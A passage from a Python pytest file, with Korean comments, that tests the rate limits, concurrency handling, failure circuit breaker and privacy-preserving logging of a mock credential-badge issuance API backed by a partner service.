def wait_for_advisory_lock_waiter(db) -> None:
    deadline = time.monotonic() + 10
    while not db.execute("SELECT EXISTS (SELECT 1 FROM pg_locks WHERE locktype = 'advisory' AND NOT granted"
                         " AND database = (SELECT oid FROM pg_database WHERE datname = current_database()))"
                         ).fetchone()["exists"]:
        assert time.monotonic() < deadline, "두 번째 예약이 잠금을 기다리지 않았다"
        time.sleep(0.01)


@pytest.mark.parametrize("level", list(DEFAULT_ISOLATION))
def test_mock_issuance_reservation_counts_rows_committed_while_it_waited(register, monkeypatch, db, level):
    # 회귀: 예약 트랜잭션이 DB 기본 격리 수준을 따랐다. REPEATABLE READ면 잠금을 기다리기 전에 잡은 스냅샷으로 세어
    # 앞 요청이 커밋한 기록을 못 보고 한도를 넘겼고(한도 1에 2건), SERIALIZABLE이면 직렬화 오류(500)였다.
    # 이제 예약은 READ COMMITTED로 고정되어 잠금을 얻은 뒤 센다.
    from app.services.database import db_service, get_db_connection

    user = register()
    use_default_isolation(monkeypatch, level)
    with ThreadPoolExecutor(max_workers=1) as pool:
        with get_db_connection() as first, first.transaction():  # 앞 요청: 잠금 → 세기 → 기록 (아직 커밋 전)
            first.execute("SELECT pg_advisory_xact_lock(hashtextextended(%s, 0))", (f"mock_issuance:{user['id']}",))
            first.execute("SELECT count(*) FROM mock_issuances WHERE user_id = %s", (user["id"],))
            first.execute("INSERT INTO mock_issuances (user_id, template_id) VALUES (%s, 'tpl-default')", (user["id"],))
            second = pool.submit(db_service.reserve_mock_issuance, user["id"], "tpl-default", 1)
            wait_for_advisory_lock_waiter(db)
        assert second.result(timeout=10) == (None, "user")  # 앞 요청이 커밋한 기록까지 세어 한도에서 멈춘다
    assert len(issuance_rows(db, user)) == 1


@pytest.mark.parametrize("level", list(DEFAULT_ISOLATION))
def test_mock_issue_daily_limit_holds_for_concurrent_requests_under_any_default_isolation(
        client, register, fake_dx, monkeypatch, db, level):
    # 같은 사용자의 동시 요청 20건, 한도 3: DB 기본 격리 수준과 관계없이 정확히 3건만 협력사로 가고 나머지는 429다 (500 없음).
    use_settings(monkeypatch, MOCK_ISSUER_DAILY_LIMIT="3")
    user = register()
    issue_badge = fake_dx.issue_badge

    async def slow_issue(template_id, holder_did):
        await asyncio.sleep(0.05)  # 협력사 호출 중에 다른 요청들이 예약을 시도한다
        return await issue_badge(template_id, holder_did)

    monkeypatch.setattr(fake_dx, "issue_badge", slow_issue)
    use_default_isolation(monkeypatch, level)
    with ThreadPoolExecutor(max_workers=20) as pool:
        statuses = sorted(pool.map(lambda _: issue(client, user).status_code, range(20)))
    assert statuses == [200] * 3 + [429] * 17
    assert len(fake_dx.issued) == 3 and len(issuance_rows(db, user)) == 3


def test_failed_mock_issue_does_not_use_the_daily_limit(client, register, fake_dx, monkeypatch, db):
    use_settings(monkeypatch, MOCK_ISSUER_DAILY_LIMIT="1")
    user = register()
    fake_dx.error = ProviderError("DXWorks 오류 (500): boom", upstream_status=500)
    assert issue(client, user).status_code == 502
    assert issuance_rows(db, user) == []  # 실패한 발급은 기록을 지운다
    fake_dx.error = None
    assert issue(client, user).status_code == 200
    assert issue(client, user).status_code == 429


def db_unavailable(*_args):
    raise psycopg.OperationalError("simulated: the database is not accepting connections")


def mock_issuer_warnings(caplog) -> list[logging.LogRecord]:
    return [r for r in caplog.records if r.name == "app.api.mock_issuer" and r.levelno == logging.WARNING]


def only_issuance_id(db, user) -> str:
    return str(db.execute("SELECT id FROM mock_issuances WHERE user_id = %s", (user["id"],)).fetchone()["id"])


def test_mock_issue_returns_the_badge_when_its_hash_cannot_be_recorded(client, register, fake_dx, monkeypatch, db,
                                                                       caplog):
    # 회귀: 협력사가 이미 발급한 뒤 해시 기록(complete)이 DB 오류로 실패하면 500이라 사용자는 발급된 배지를 받지 못했다.
    # 이제 배지를 돌려주고 발급 기록 id와 예외 클래스 이름만 WARNING 한 줄로 남긴다. 예약 기록은 남아 한도에 센다
    # (해시만 비어 있다).
    from app.services.database import db_service

    use_settings(monkeypatch, MOCK_ISSUER_DAILY_LIMIT="1")
    monkeypatch.setattr(db_service, "complete_mock_issuance", db_unavailable)
    user = register()
    with caplog.at_level(logging.WARNING):
        res = issue(client, user)
    assert res.status_code == 200 and res.json()["success"] is True
    vc_jwt = res.json()["vcJwt"]
    assert fake_dx.issued == [("tpl-default", user["did"])]
    assert issuance_rows(db, user) == [{"template_id": "tpl-default", "token_sha256": None}]
    [warning] = mock_issuer_warnings(caplog)
    # 운영자가 DB 오류 종류를 알 수 있게 예외 클래스 이름은 남기고, 토큰·DID·예외 메시지는 남기지 않는다.
    issuance_id = only_issuance_id(db, user)
    assert warning.args == (issuance_id, "OperationalError")
    assert warning.getMessage() == (
        f"Mock issuance token hash not recorded: issuance={issuance_id} error=OperationalError")
    assert not any(text in warning.getMessage() for text in (vc_jwt, user["did"], "simulated", "not accepting"))
    assert not any(r.getMessage() == "Unhandled error" for r in caplog.records)
    assert issue(client, user).status_code == 429  # 발급된 자리는 한도에 센다
    assert verify(client, user, vc_jwt).json()["success"] is True  # 받은 배지는 지금처럼 검증·저장된다


@pytest.mark.parametrize("error,status,body", [
    (ProviderError("DXWorks 오류 (500): boom", upstream_status=500), 502,
     {"detail": "Credential service error", "code": "PROVIDER_ERROR"}),
    (ProviderError("DXWORKS_API_KEY가 설정되지 않았습니다", unavailable=True), 503,
     {"detail": "Credential service is not configured", "code": "PROVIDER_NOT_CONFIGURED"}),
], ids=["provider-error", "not-configured"])
def test_failed_mock_issue_keeps_its_error_when_the_reservation_cannot_be_cancelled(
        client, register, fake_dx, monkeypatch, db, caplog, error, status, body):
    # 회귀: 협력사 발급이 실패한 뒤 예약 취소(cancel)도 DB 오류로 실패하면 그 DB 오류가 원래 오류를 덮어 500이었다.
    # 이제 원래 오류(502/503)로 답하고 발급 기록 id와 예외 클래스 이름만 WARNING 한 줄로 남긴다. 지우지 못한 자리는 한도에 센다.
    from app.services.database import db_service

    use_settings(monkeypatch, MOCK_ISSUER_DAILY_LIMIT="1")
    monkeypatch.setattr(db_service, "cancel_mock_issuance", db_unavailable)
    user = register()
    fake_dx.error = error
    with caplog.at_level(logging.WARNING):
        res = issue(client, user)
    assert res.status_code == status and res.json() == body
    [warning] = mock_issuer_warnings(caplog)
    # 취소를 막은 DB 오류의 클래스 이름이다 (원래 오류는 아래 'Provider error' 줄에 따로 남는다). 예외 메시지·DID는 없다.
    issuance_id = only_issuance_id(db, user)
    assert warning.args == (issuance_id, "OperationalError")
    assert warning.getMessage() == (
        f"Mock issuance cancel failed; the reservation stays counted: issuance={issuance_id} error=OperationalError")
    assert not any(text in warning.getMessage() for text in (user["did"], "simulated", "not accepting", error.message))
    assert any(r.getMessage().startswith("Provider error:") for r in caplog.records)  # 원래 오류가 그대로 처리됐다
    assert not any(r.getMessage() == "Unhandled error" for r in caplog.records)
    assert issuance_rows(db, user) == [{"template_id": "tpl-default", "token_sha256": None}]
    fake_dx.error = None
    assert issue(client, user).status_code == 429 and fake_dx.issued == []


def test_mock_issue_with_plain_http_host_is_503_and_not_counted(client, register, db):
    # 실제 어댑터: 평문 http 호스트면 회사 API 키로 아무것도 보내지 않고(503) 한도도 쓰지 않는다.
    from app.integrations import get_issuer
    from app.integrations.dxworks import DXWorksAdapter
    from main import app

    sent = []

    def handler(request):
        sent.append(request)
        return httpx.Response(201, json={"data": {"id": "c1", "jwt": "a.b.c"}})

    user = register()
    app.dependency_overrides[get_issuer] = lambda: DXWorksAdapter("http://dx.invalid", "test-key",
                                                                  transport=httpx.MockTransport(handler))
    res = issue(client, user)
    assert res.status_code == 503 and sent == []
    assert issuance_rows(db, user) == []


def real_issuer(handler):
    """실제 DXWorksAdapter를 발급기로 끼운다 (전송 계층만 MockTransport). 협력사로 나간 요청 목록을 돌려준다."""
    from app.integrations import get_issuer
    from app.integrations.dxworks import DXWorksAdapter
    from main import app

    sent = []

    def counting(request):
        sent.append(request.url.path)
        return handler(request)

    app.dependency_overrides[get_issuer] = lambda: DXWorksAdapter("https://dx.invalid", "test-key",
                                                                  transport=httpx.MockTransport(counting))
    return sent


def read_timeout(request):
    raise httpx.ReadTimeout("slow response")


UNKNOWN_OUTCOMES = {
    "read-timeout": read_timeout,
    "2xx-without-jwt": lambda request: httpx.Response(201, json={"data": {"id": "c1"}}),
    "2xx-not-json": lambda request: httpx.Response(200, content=b"<html>issued</html>"),
    "2xx-too-large": lambda request: httpx.Response(201, json={"data": {"jwt": "a." + "b" * 1_100_000 + ".c"}}),
}


@pytest.mark.parametrize("handler", list(UNKNOWN_OUTCOMES.values()), ids=list(UNKNOWN_OUTCOMES))
def test_mock_issue_with_unknown_outcome_keeps_the_reservation(client, register, monkeypatch, db, caplog, handler):
    # 회귀: 요청이 협력사에 닿은 뒤 결과를 모르는 실패(응답 대기 중 시간 초과, jwt 없는 2xx)도 한도 기록을 지웠다.
    # 배지는 이미 발급됐을 수 있으므로, 이런 실패를 되풀이하면 한도가 줄지 않은 채 회사 API 키로 계속 발급할 수 있었다.
    use_settings(monkeypatch, MOCK_ISSUER_DAILY_LIMIT="2")
    user = register()
    sent = real_issuer(handler)
    with caplog.at_level(logging.WARNING):
        statuses = [issue(client, user).status_code for _ in range(4)]
    assert statuses == [502, 502, 429, 429] and len(sent) == 2  # 한도에 닿은 뒤에는 협력사를 부르지 않는다
    assert issuance_rows(db, user) == [{"template_id": "tpl-default", "token_sha256": None}] * 2
    warnings = [r.getMessage() for r in mock_issuer_warnings(caplog)]
    issuance_ids = [str(r["id"]) for r in db.execute(
        "SELECT id FROM mock_issuances WHERE user_id = %s ORDER BY created_at", (user["id"],)).fetchall()]
    assert warnings == [f"Mock issuance outcome unknown; the reservation stays counted: issuance={issuance_id}"
                        for issuance_id in issuance_ids]
    assert not any(user["did"] in line for line in warnings)


DEFINITE_FAILURES = {
    "500": lambda request: httpx.Response(500, json={"error": {"message": "boom"}}),
    "429": lambda request: httpx.Response(429, json={"error": {"message": "slow down"}}),
    "404": lambda request: httpx.Response(404, json={"error": {"code": "TEMPLATE_NOT_FOUND"}}),
    "302": lambda request: httpx.Response(302, headers={"Location": "https://elsewhere.invalid/"}),
}


@pytest.mark.parametrize("handler", list(DEFINITE_FAILURES.values()), ids=list(DEFINITE_FAILURES))
def test_mock_issue_refused_by_the_partner_still_does_not_use_the_daily_limit(client, register, monkeypatch, db,
                                                                              handler):
    # 협력사가 거절·실패로 답한 발급(5xx·429·4xx·3xx)은 지금처럼 한도에 세지 않는다 (실패까지 세는 것은 시도 한도다).
    use_settings(monkeypatch, MOCK_ISSUER_DAILY_LIMIT="1")
    user = register()
    sent = real_issuer(handler)
    assert [issue(client, user).status_code for _ in range(3)] == [502] * 3 and len(sent) == 3
    assert issuance_rows(db, user) == []


@pytest.fixture
def issue_attempts(monkeypatch):
    """모의 발급 시도 한도를 손으로 움직이는 시계와 작은 한도(3번)로 바꾼다.

    시도 한도는 max(MOCK_ISSUE_ATTEMPTS, 3 × MOCK_ISSUER_DAILY_LIMIT)이므로 발급 한도도 1로 둔다 (3 × 1 = 3).
    """
    from app.api import mock_issuer
    from app.services.verifier_budget import AttemptWindow

    clock = {"now": 1000.0}
    attempts = AttemptWindow(3, 24 * 60 * 60, clock=lambda: clock["now"])
    monkeypatch.setattr(mock_issuer, "mock_issue_attempts", attempts)
    monkeypatch.setattr(mock_issuer, "MOCK_ISSUE_ATTEMPTS", 3)
    use_settings(monkeypatch, MOCK_ISSUER_DAILY_LIMIT="1")
    return attempts, clock


PAUSED = {"detail": "Mock issuance is paused after repeated failures. Try again shortly."}


@pytest.fixture
def issue_breaker(monkeypatch):
    """태스크 전체의 모의 발급 실패 차단기를 손으로 움직이는 시계로 바꾼다 (운영과 같은 24시간 창·60초 탐침 간격, 한도는
    MOCK_ISSUER_GLOBAL_DAILY_LIMIT). (차단기, 시계)를 돌려준다."""
    from app.api import mock_issuer
    from app.services.verifier_budget import FailureBreaker

    clock = {"now": 1000.0}
    breaker = FailureBreaker(24 * 60 * 60, 60, clock=lambda: clock["now"])
    monkeypatch.setattr(mock_issuer, "mock_issue_breaker", breaker)
    return breaker, clock


class CountingIssuer:
    """협력사 발급 호출을 세는 가짜 발급기. failing이 켜져 있는 동안은 협력사가 503으로 답한 것처럼 실패한다."""

    def __init__(self, inner):
        self.inner, self.calls, self.failing = inner, 0, True

    async def issue_badge(self, template_id: str, holder_did: str):
        self.calls += 1
        if self.failing:
            raise ProviderError("DXWorks 오류 (503): unavailable", upstream_status=503)
        return await self.inner.issue_badge(template_id, holder_did)


def failing_partner(fake_dx) -> CountingIssuer:
    """이 테스트에서만 발급기를 CountingIssuer로 바꾼다 (client 픽스처가 끝날 때 원래대로 지운다)."""
    from app.integrations import get_issuer
    from main import app

    partner = CountingIssuer(fake_dx)
    app.dependency_overrides[get_issuer] = lambda: partner
    return partner


def test_mock_issue_attempts_are_capped_even_when_every_attempt_fails(client, register, db, issue_attempts):
    # 회귀: 한도는 성공한 발급만 셌다. 협력사가 실패하거나 우리를 제한(429)하는 동안에는 한 계정이 회사 API 키가 붙은
    # 발급 요청을 끝없이 다시 보낼 수 있었다. 이제 협력사까지 간 시도는 실패해도 사용자별 24시간 시도 한도에 센다.
    _, clock = issue_attempts
    alice, bob = register(), register()
    sent = real_issuer(DEFINITE_FAILURES["429"])
    statuses = [issue(client, alice).status_code for _ in range(10)]
    assert statuses == [502] * 3 + [429] * 7 and len(sent) == 3
    limited = issue(client, alice)
    assert limited.json() == {"detail": "Mock issuance limit reached; try again later"}
    assert "retry-after" not in limited.headers  # 지금의 한도 초과 응답과 같다
    assert issuance_rows(db, alice) == []
    assert issue(client, bob).status_code == 502 and len(sent) == 4  # 다른 사용자는 따로 센다
    clock["now"] += 24 * 60 * 60  # 24시간 뒤에는 다시 시도할 수 있다
    assert issue(client, alice).status_code == 502 and len(sent) == 5


def test_mock_issue_attempt_cap_counts_only_requests_that_reach_the_partner(client, register, fake_dx, monkeypatch,
                                                                            issue_attempts, db):
    attempts, _ = issue_attempts
    user = register()
    # 협력사를 부르기 전에 끝난 요청(허용되지 않은 템플릿, 남의 DID, 설정 누락 503, 발급 한도 429)은 시도로 세지 않는다.
    assert issue(client, user, templateId="not-allowed").status_code == 403
    assert client.post("/api/mock-issuer/issue", json={"holderDid": "did:key:z6MkSomeoneElse"},
                       headers=user["headers"]).status_code == 403
    fake_dx.error = ProviderError("DXWORKS_API_KEY가 설정되지 않았습니다", unavailable=True)
    assert [issue(client, user).status_code for _ in range(5)] == [503] * 5
    assert user["id"] not in attempts._attempts
    fake_dx.error = None
    assert issue(client, user).status_code == 200
    assert [issue(client, user).status_code for _ in range(5)] == [429] * 5  # DB 한도(성공 1건)
    assert len(attempts._attempts[user["id"]]) == 1 and len(fake_dx.issued) == 1
    # 성공한 발급과 협력사가 실패로 답한 발급은 둘 다 시도다 (DB의 발급 기록을 지워 발급 한도는 비워 둔다).
    db.execute("DELETE FROM mock_issuances WHERE user_id = %s", (user["id"],))
    fake_dx.error = ProviderError("DXWorks 오류 (500): boom", upstream_status=500)
    assert [issue(client, user).status_code for _ in range(4)] == [502, 502, 429, 429]


@pytest.mark.parametrize("daily_limit,cap", [("1", 30), ("10", 30), ("11", 33), ("50", 150)])
def test_mock_issue_attempt_cap_follows_a_raised_daily_limit(client, register, fake_dx, monkeypatch, db, daily_limit,
                                                             cap):
    # 회귀: 시도 한도가 30으로 고정이라 MOCK_ISSUER_DAILY_LIMIT을 30보다 크게 두면(예: 50) 31번째 정상 발급부터 429였다
    # (성공한 발급도 시도로 센다). 이제 한도는 max(30, 3 × MOCK_ISSUER_DAILY_LIMIT)이다.
    from app.services.verifier_budget import MOCK_ISSUE_ATTEMPTS, mock_issue_attempts

    assert MOCK_ISSUE_ATTEMPTS == 30
    db.execute("DELETE FROM mock_issuances")
    use_settings(monkeypatch, MOCK_ISSUER_DAILY_LIMIT=daily_limit, MOCK_ISSUER_GLOBAL_DAILY_LIMIT="1000")
    user = register()
    if int(daily_limit) > 30:
        # 올린 발급 한도만큼 정상 발급이 모두 된다 (31번째에서 막히지 않는다).
        assert [issue(client, user).status_code for _ in range(int(daily_limit))] == [200] * int(daily_limit)
        assert issue(client, user).json() == {"detail": "Mock issuance limit reached; try again later"}
        db.execute("DELETE FROM mock_issuances WHERE user_id = %s", (user["id"],))
        mock_issue_attempts.clear()
    # 협력사가 실패하는 동안의 시도는 cap번까지만 협력사로 간다.
    fake_dx.error = ProviderError("DXWorks 오류 (500): boom", upstream_status=500)
    statuses = [issue(client, user).status_code for _ in range(cap + 3)]
    assert statuses == [502] * cap + [429] * 3


def test_failed_mock_issues_of_all_accounts_share_one_task_wide_breaker(client, register, monkeypatch, db,
                                                                        issue_breaker):
    # 회귀: 실패한 발급은 사용자별 시도 한도(30번)만 셌다. 협력사가 실패하거나 우리를 제한(503·429)하는 동안에는 계정 수만큼
    # 곱해져(8계정이면 240번) 회사 API 키가 붙은 요청이 나갔다. 이제 태스크 전체의 실패가 24시간에
    # MOCK_ISSUER_GLOBAL_DAILY_LIMIT번 쌓이면 발급을 멈추고, 60초마다 요청 하나(탐침)만 협력사로 보낸다.
    breaker, clock = issue_breaker
    db.execute("DELETE FROM mock_issuances")
    use_settings(monkeypatch, MOCK_ISSUER_GLOBAL_DAILY_LIMIT="12")
    users = [register() for _ in range(8)]
    sent = real_issuer(lambda request: httpx.Response(503, json={"error": {"message": "unavailable"}}))
    responses = [issue(client, user) for _ in range(5) for user in users]  # 8계정 × 5번 = 40번
    # 실패 12번으로 창이 차고 다음 요청 하나가 탐침으로 나간다 (역시 실패). 그 뒤로는 어느 계정의 요청도 협력사로 가지 않는다.
    assert [res.status_code for res in responses] == [502] * 13 + [429] * 27
    assert len(sent) == 13
    assert responses[-1].json() == PAUSED and responses[-1].headers["retry-after"] == "60"
    assert db.execute("SELECT count(*) AS n FROM mock_issuances").fetchone()["n"] == 0
    # 멈춘 동안 거절된 요청은 사용자별 시도 한도에도 세지 않는다.
    from app.services.verifier_budget import mock_issue_attempts

    assert sum(len(stamps) for stamps in mock_issue_attempts._attempts.values()) == 13
    # 실패한 탐침은 차단기를 그대로 둔다: 다음 탐침은 60초 뒤다 (Retry-After가 그때까지 남은 초다).
    clock["now"] += 59
    refused = issue(client, users[0])
    assert refused.status_code == 429 and refused.json() == PAUSED and refused.headers["retry-after"] == "1"
    assert len(sent) == 13
    clock["now"] += 1
    assert [issue(client, user).status_code for user in users[:3]] == [502, 429, 429] and len(sent) == 14
    assert len(breaker._failures) == 12  # 탐침은 실패해도 창에 더 쌓이지 않는다


def test_mock_issue_reopens_for_everyone_with_the_first_successful_probe(client, register, fake_dx, db,
                                                                         issue_breaker):
    # 회귀: 실패 창이 차면 협력사가 돌아와도 24시간이 지나거나 재시작할 때까지 아무도 발급하지 못했다 (수업 중에 장애가 나
    # 학생들이 몇 번씩 다시 누르면 200번은 금방이다). 이제 탐침 하나가 성공하면 실패 기록을 모두 지워 바로 다시 연다.
    breaker, clock = issue_breaker
    db.execute("DELETE FROM mock_issuances")
    partner = failing_partner(fake_dx)
    students = [register() for _ in range(8)]
    statuses = [issue(client, student).status_code for _ in range(25) for student in students]  # 8명 × 25번
    assert statuses == [502] * 200 and partner.calls == 200  # 기본 한도 (MOCK_ISSUER_GLOBAL_DAILY_LIMIT=200)
    assert issue(client, students[0]).status_code == 502 and partner.calls == 201  # 탐침 (실패)
    assert issue(client, students[1]).json() == PAUSED and partner.calls == 201
    # 협력사가 돌아왔다. 한 번도 시도한 적 없는 사용자도 탐침 간격 안에는 기다리고, 간격이 지나면 탐침으로 발급받는다.
    partner.failing = False
    newcomer = register()
    clock["now"] += 10
    waiting = issue(client, newcomer)
    assert waiting.status_code == 429 and waiting.json() == PAUSED and waiting.headers["retry-after"] == "50"
    assert partner.calls == 201
    clock["now"] += 50
    assert issue(client, newcomer).status_code == 200 and partner.calls == 202
    assert len(breaker._failures) == 0
    # 그 뒤로는 모두가 기다리지 않고 지금처럼 발급한다 (새 사용자 10명, 장애 동안 실패했던 학생들).
    others = [register() for _ in range(10)]
    assert [issue(client, user).status_code for user in others] == [200] * 10
    assert [issue(client, student).status_code for student in students[:2]] == [200, 200]
    assert partner.calls == 214 and len(breaker._failures) == 0
    assert db.execute("SELECT count(*) AS n FROM mock_issuances").fetchone()["n"] == 13


def test_an_hour_of_partner_failure_sends_the_limit_and_then_one_probe_a_minute(client, register, fake_dx, db,
                                                                                issue_breaker):
    # 협력사가 한 시간 내내 실패하고 학생 40명이 계속 다시 누를 때 회사 API 키로 나가는 요청: 한도(200) + 분당 탐침 하나.
    _, clock = issue_breaker
    db.execute("DELETE FROM mock_issuances")
    partner = failing_partner(fake_dx)
    students = [register() for _ in range(40)]
    start = clock["now"]
    answers = [issue(client, student) for _ in range(5) for student in students]  # 장애가 난 순간: 40명 × 5번
    assert [res.status_code for res in answers] == [502] * 200 and partner.calls == 200
    refusals = []
    for tick in range(1, 181):  # 그 뒤 한 시간: 20초마다 학생 한 명씩 돌아가며 다시 누른다 (180번)
        clock["now"] = start + 20 * tick
        res = issue(client, students[tick % 40])
        if res.status_code == 429:
            refusals.append(res)
        else:
            assert res.status_code == 502
    assert partner.calls == 200 + 60  # 탐침은 20초, 80초, …, 3560초에 하나씩 60번
    assert len(refusals) == 120 and all(res.json() == PAUSED for res in refusals)
    # Retry-After는 다음 탐침까지 남은 초다 (탐침 20초 뒤의 요청은 40, 40초 뒤의 요청은 20).
    assert Counter(res.headers["retry-after"] for res in refusals) == {"40": 60, "20": 60}
    assert db.execute("SELECT count(*) AS n FROM mock_issuances").fetchone()["n"] == 0


def test_a_probe_that_never_reaches_the_partner_is_given_back(client, register, fake_dx, monkeypatch, db,
                                                              issue_breaker):
    # 탐침 차례에 들어온 요청이 협력사를 부르지 않고 끝나면(그 사용자의 DB 발급 한도 거절, 설정 오류) 탐침 기회를 쓰지 않는다:
    # 바로 다음 요청이 탐침이 된다 (발급 한도가 찬 계정이 탐침을 가져가 다른 사람들이 다시 열리는 것을 미루지 못한다).
    breaker, _ = issue_breaker
    db.execute("DELETE FROM mock_issuances")
    use_settings(monkeypatch, MOCK_ISSUER_DAILY_LIMIT="1", MOCK_ISSUER_GLOBAL_DAILY_LIMIT="3")
    full, other, third = register(), register(), register()
    assert issue(client, full).status_code == 200  # 이 사용자는 자기 발급 한도(1건)를 다 썼다
    fake_dx.error = ProviderError("DXWorks 오류 (503): down", upstream_status=503)
    assert [issue(client, other).status_code for _ in range(3)] == [502] * 3  # 창이 찼다 (탐침은 아직 나가지 않았다)
    assert len(breaker._failures) == 3 and breaker._last_probe is None
    fake_dx.error = None
    for _ in range(3):  # 탐침 차례지만 DB 한도에 막혀 협력사로 가지 않는다: 자기 한도 문구로 답하고 탐침은 남는다
        assert issue(client, full).json() == {"detail": "Mock issuance limit reached; try again later"}
    assert breaker._last_probe is None and len(fake_dx.issued) == 1
    fake_dx.error = ProviderError("DXWORKS_API_KEY가 설정되지 않았습니다", unavailable=True)
    assert issue(client, third).status_code == 503 and breaker._last_probe is None  # 설정 오류로 끝난 탐침도 같다
    fake_dx.error = None
    # 다음 요청이 탐침으로 나가 성공하고, 모두에게 다시 열린다.
    assert issue(client, third).status_code == 200 and len(breaker._failures) == 0
    assert issue(client, other).status_code == 200 and len(fake_dx.issued) == 3


def test_parallel_requests_at_a_full_window_send_exactly_one_probe(client, register, fake_dx, monkeypatch, db,
                                                                   issue_breaker):
    # 창이 찬 뒤 한꺼번에 들어온 요청 20개 가운데 협력사로 가는 것은 탐침 하나뿐이다.
    breaker, _ = issue_breaker
    db.execute("DELETE FROM mock_issuances")
    use_settings(monkeypatch, MOCK_ISSUER_GLOBAL_DAILY_LIMIT="4", DB_MAX_CONNECTIONS="10")
    users = [register() for _ in range(4)]
    calls = []

    async def slow_failure(template_id, holder_did):
        calls.append(holder_did)
        await asyncio.sleep(0.1)  # 탐침이 답을 기다리는 동안 나머지 요청이 들어온다
        raise ProviderError("DXWorks 오류 (503): down", upstream_status=503)

    monkeypatch.setattr(fake_dx, "issue_badge", slow_failure)
    assert [issue(client, user).status_code for user in users] == [502] * 4 and len(calls) == 4  # 창을 채운다
    with ThreadPoolExecutor(max_workers=20) as pool:
        responses = list(pool.map(lambda n: issue(client, users[n % 4]), range(20)))
    assert sorted(res.status_code for res in responses) == [429] * 19 + [502]
    assert len(calls) == 5 and len(breaker._failures) == 4
    assert all(res.json() == PAUSED and res.headers["retry-after"] == "60"
               for res in responses if res.status_code == 429)


@pytest.mark.parametrize("limit", [8, 20])
async def test_a_burst_with_a_healthy_partner_gets_the_service_limit_text_not_the_paused_one(client, register, fake_dx,
                                                                                            monkeypatch, db, limit):
    # 회귀(XBE-2): 진행 중인 요청도 차단기 창에 자리를 잡으므로, 전체 한도가 작을 때 학생 40명이 한꺼번에 누르면 아무것도
    # 실패하지 않았는데 '잇단 실패로 멈춤' 문구와 Retry-After 60을 받았다 (탐침 하나도 나갔다). 이제 창에 실패로 끝난 요청이
    # 없으면 탐침 없이 전체 한도 문구로 답한다 (남은 몫은 진행 중인 요청이 잡고 있다).
    from app.services import database
    from app.services.verifier_budget import mock_issue_attempts, mock_issue_breaker
    from main import app

    db.execute("DELETE FROM mock_issuances")
    use_settings(monkeypatch, MOCK_ISSUER_GLOBAL_DAILY_LIMIT=str(limit), DB_MAX_CONNECTIONS="10")
    monkeypatch.setattr(database, "app_db_slots", database._ConnectionSlots())  # 위 DB_MAX_CONNECTIONS로 다시 만든다
    students = [register() for _ in range(40)]
    issue_badge = fake_dx.issue_badge

    async def healthy(template_id, holder_did):
        await asyncio.sleep(0.3)  # 협력사는 정상이다 (0.3초 뒤 발급)
        return await issue_badge(template_id, holder_did)

    monkeypatch.setattr(fake_dx, "issue_badge", healthy)
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://testserver") as ac:
        responses = await asyncio.gather(*(ac.post("/api/mock-issuer/issue", json={"holderDid": student["did"]},
                                                   headers=student["headers"]) for student in students))
    assert sorted(res.status_code for res in responses) == [200] * limit + [429] * (40 - limit)
    assert all(res.json() == {"detail": "Mock issuance service limit reached; try again later."}
               and "retry-after" not in res.headers for res in responses if res.status_code == 429)
    assert len(fake_dx.issued) == limit
    assert len(mock_issue_breaker._failures) == 0 and mock_issue_breaker._last_probe is None  # 탐침도 나가지 않았다
    # 전체 한도 문구로 거절된 요청은 사용자별 시도를 돌려준다: 남은 시도는 발급된 요청의 것뿐이다.
    assert sum(len(stamps) for stamps in mock_issue_attempts._attempts.values()) == limit


def test_failures_older_than_a_day_leave_the_breaker_by_themselves(client, register, fake_dx, monkeypatch, db,
                                                                   issue_breaker):
    breaker, clock = issue_breaker
    db.execute("DELETE FROM mock_issuances")
    use_settings(monkeypatch, MOCK_ISSUER_GLOBAL_DAILY_LIMIT="3")
    user, other = register(), register()
    fake_dx.error = ProviderError("DXWorks 오류 (503): down", upstream_status=503)
    assert [issue(client, user).status_code for _ in range(5)] == [502] * 4 + [429]  # 실패 3번 + 탐침 1번
    clock["now"] += 24 * 60 * 60 - 1
    assert [issue(client, user).status_code for _ in range(2)] == [502, 429]  # 아직 창 안이다: 탐침 하나뿐
    clock["now"] += 1
    # 24시간이 지난 실패는 세지 않는다: 탐침이 성공하지 않았어도 다시 한도만큼은 보통 요청으로 받는다.
    assert [issue(client, other).status_code for _ in range(3)] == [502] * 3
    assert len(breaker._failures) == 3


def test_failure_breaker_keeps_only_failed_and_unknown_outcomes(client, register, fake_dx, monkeypatch, db,
                                                                issue_breaker):
    breaker, _ = issue_breaker
    db.execute("DELETE FROM mock_issuances")
    use_settings(monkeypatch, MOCK_ISSUER_DAILY_LIMIT="2", MOCK_ISSUER_GLOBAL_DAILY_LIMIT="50")
    user, other = register(), register()

    def kept() -> int:
        return len(breaker._failures)

    # 남지 않는 것: 성공, 협력사를 부르기 전에 끝난 요청(허용되지 않은 템플릿, 설정 누락 503, 사용자별 발급 한도 429).
    assert issue(client, user).status_code == 200 and kept() == 0
    assert issue(client, user, templateId="not-allowed").status_code == 403 and kept() == 0
    fake_dx.error = ProviderError("DXWORKS_API_KEY가 설정되지 않았습니다", unavailable=True)
    assert issue(client, user).status_code == 503 and kept() == 0
    fake_dx.error = None
    assert issue(client, user).status_code == 200
    assert issue(client, user).json() == {"detail": "Mock issuance limit reached; try again later"} and kept() == 0
    # 남는 것: 협력사가 실패로 답한 발급, 결과를 모르는 실패.
    fake_dx.error = ProviderError("DXWorks 오류 (429): slow down", upstream_status=429)
    assert issue(client, other).status_code == 502 and kept() == 1
    fake_dx.error = ProviderError("DXWorks 연결 실패: ReadTimeout", ambiguous=True)
    assert issue(client, other).status_code == 502 and kept() == 2
    fake_dx.error = ProviderError("DXWorks 연결 실패: ConnectError")
    assert issue(client, other).status_code == 502 and kept() == 3
    assert breaker._last_probe is None  # 창이 찬 적이 없으니 탐침도 없었다


def test_mock_issue_attempt_window_and_breaker_end_empty_when_the_reservation_fails(client, register, fake_dx,
                                                                                    monkeypatch, db, issue_breaker):
    # 발급 기록 예약이 DB 오류로 실패하면 협력사를 부르지 않았으므로 시도 창과 차단기 어디에도 아무것도 남지 않는다.
    from app.services.database import db_service
    from app.services.verifier_budget import mock_issue_attempts

    breaker, _ = issue_breaker
    db.execute("DELETE FROM mock_issuances")
    user = register()
    use_settings(monkeypatch, MOCK_ISSUER_GLOBAL_DAILY_LIMIT="2")
    fake_dx.error = ProviderError("DXWorks 오류 (503): down", upstream_status=503)
    assert [issue(client, user).status_code for _ in range(2)] == [502] * 2  # 창을 채운다: 다음 요청은 탐침 차례다
    mock_issue_attempts.clear()
    fake_dx.error = None
    monkeypatch.setattr(db_service, "reserve_mock_issuance", db_unavailable)
